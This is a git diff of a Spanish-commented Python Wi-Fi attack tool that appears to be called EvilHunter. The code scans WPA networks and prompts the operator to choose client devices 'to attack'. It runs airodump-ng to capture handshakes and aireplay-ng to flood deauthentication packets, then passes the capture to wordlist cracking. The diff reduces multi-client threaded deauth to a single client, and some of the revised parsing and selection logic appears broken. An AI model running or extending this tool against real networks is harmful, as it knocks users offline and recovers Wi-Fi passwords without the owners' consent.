@@ -1,6 +1,5 @@
 #!/bin/python3
 # SUBIR A PYPI
-
 try:
     # Importamos librerias
     print("\n[*] Starting...")
@@ -432,21 +431,12 @@ def network_process_data(macs, net_clients, args, all_got):
         n_d = 0
 
         if re.findall("-[0-9]+", info):
-            encription = re.findall("WPA[0-9]+[ ]+[A-Z]+[ ]+[A-Z]+", info)
-            if not encription:
-                encription = re.findall("WPA+[ ]+[A-Z]+[ ]+[A-Z]+", info)
-                if not encription:
-                    continue
+            encription = re.findall("WPA[0-9]  [A-Z]+  +[A-Z]+", info)
 
-            try:
-                channel = info.split()[info.split().index("WPA2") - 2]
-            except ValueError:
-                channel = info.split()[info.split().index("WPA3") - 2]
-            except ValueError:
-                channel = info.split()[info.split().index("WPA") - 2]
-            except ValueError:
+            if not encription:
                 continue
 
+            channel = info.split()[info.split().index("WPA2") - 2]
             name = info.split()[info.split().index("WPA2") + 3]
             if re.findall("^(<length:*)", name):
                 name = f"N/D_{n_d}"
@@ -580,7 +570,7 @@ def prepare_attack(net_specs, net_clients, network_to_attack, args):
 
 def print_clients(net_clients, bssid):
     print(Fore.YELLOW + "\n\n[*] " + Fore.LIGHTBLUE_EX + "Listing clients of the network\n" + Fore.RESET)
-    print("\tPara atacar a más de 1 cliente, ¡Números seguidos por coma!:\n\n\t\t\t" + Fore.RED + " [E.j: 1,2]\n")
+    print("\tPara atacar a más de 1 cliente, ¡Números seguidos por coma!:\n\t\t\t" + Fore.RED + " [E.j: 1,2]")
 
     # CLIENTES DE RED INFO:
     for net_num in net_clients['networks']:
@@ -596,56 +586,29 @@ def print_clients(net_clients, bssid):
         client = clients_of_net[client_num]
         print("\t" + Fore.RED + f"{client_num} ---> " + Fore.WHITE + f"{client}\n")
 
-    return select_client(clients_of_net)
+    select_client(clients_of_net)
 
 
 def select_client(clients):
     # Escogemos un cliente
-    clients_to_attack = []
-    clients_to_do_attack = None
-
-    while not clients_to_do_attack:
-        clients_to_do_attack = None
+    client = None
+    while not client:
         num_client = input(Fore.YELLOW + "\n[!>] " + Fore.WHITE + "Client or clients to attack (E.j '1'): ")
-        num_clients = num_client.replace(" ", "").split(",")
 
-        if len(num_clients) > 1:
-            for client in num_clients:
-                if clients_to_do_attack == 0:
-                    break
-                clients_to_do_attack = verify_clients(client, clients, clients_to_attack)
+        num_clients = num_client.split(",")
+        for client in num_clients:
+            # Si no existe el numero de cliente, seguimos preguntando
+            if num_client not in clients:
+                print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "El cliente Nº{} no ha sido detectado..".format(num_client))
+                client = None
 
-            if clients_to_do_attack != 0:
-                break
-
-        else:
-            clients_to_do_attack = verify_clients(num_client, clients, clients_to_attack)
-            if clients_to_do_attack != 0:
-                break
-
+            # Si existe rompemos bucle y seguimos...
+            elif num_client in clients:
+                print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Cliente encontrado!")
+                client = clients[num_client]
+                time.sleep(0.5)
     # Devolvemos cliente a atacar
-    return clients_to_do_attack
-
-
-def verify_clients(client, clients, clients_to_attack):
-    try:
-        client = int(client)
-    except ValueError:
-        print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "Carácter invalido... ['{}']".format(client))
-        client = None
-
-    # Si no existe el numero de cliente, seguimos preguntando
-    if client not in clients:
-        print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "El cliente Nº{} no ha sido detectado..".format(client))
-        return 0
-
-    # Si existe rompemos bucle y seguimos...
-    elif client in clients:
-        print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Cliente encontrado! -->", client)
-        clients_to_attack.append(clients[client])
-        time.sleep(0.5)
-
-    return clients_to_attack
+    return client
 
 
 def capture_handshake(direc, args, bssid, ch, file, network_to_attack, attack_client):
@@ -655,18 +618,10 @@ def capture_handshake(direc, args, bssid, ch, file, network_to_attack, attack_cl
     hand = subprocess.Popen(["airodump-ng", "-w", f"/home/EvilHunter_Data/captures/{network_to_attack}/"
                              + file, "-c", ch, "--bssid", bssid,
                              f"{interface}"], stdout=subprocess.PIPE)
-
     # Si tenemos cliente  para atacar:
     if attack_client is not None:
-        threads = []
-        for client in attack_client:
-            thread = threading.Thread(target=deauth_client, args=(bssid, client))
-            thread.start()
-            threads.append(thread)
-
-        # Esperar a que todos los hilos terminen
-        for thread in threads:
-            thread.join()
+        subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, "-c", attack_client, interface],
+                         stdout=subprocess.DEVNULL)
     # Si no al broadcast
     else:
         subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface],
@@ -693,10 +648,6 @@ def capture_handshake(direc, args, bssid, ch, file, network_to_attack, attack_cl
         print(Fore.RED + "\n\t[T] " + Fore.YELLOW + "Hanshake no capturado...")
         exiting(err=True)
     crack_handshake(direc, args, file, network_to_attack)
-
-
-def deauth_client(bssid, client):
-    subprocess.Popen(['aireplay-ng', '--deauth', '0', '-a', bssid, '-c', client, interface], stdout=subprocess.DEVNULL)
 
 
 def find_wordlists(wordlists):
